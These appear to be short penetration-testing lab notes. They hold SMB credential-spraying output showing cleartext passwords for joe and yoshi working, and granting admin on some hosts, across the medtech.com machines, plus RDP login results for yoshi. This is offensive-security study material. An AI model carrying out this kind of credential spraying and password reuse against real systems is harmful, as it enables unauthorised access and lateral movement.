```sh
SMB         172.16.203.12   445    DEV04            [+] medtech.com\joe:Flowers1 
SMB         172.16.203.11   445    FILES02          [+] medtech.com\joe:Flowers1 (Pwn3d!)
SMB         172.16.203.10   445    DC01             [+] medtech.com\joe:Flowers1 
SMB         172.16.203.13   445    PROD01           [+] medtech.com\joe:Flowers1 
SMB         172.16.203.83   445    CLIENT02         [+] medtech.com\joe:Flowers1 
SMB         172.16.203.82   445    CLIENT01         [+] medtech.com\joe:Flowers1

SMB         172.16.203.82   445    CLIENT01         [+] medtech.com\yoshi:Mushroom! (Pwn3d!)
```

Tried `squishhop` password, doesn't work on anyone!

```sh
[3389][rdp] host: 172.16.203.12   login: yoshi   password: Mushroom!
[3389][rdp] host: 172.16.203.82   login: yoshi   password: Mushroom!
```

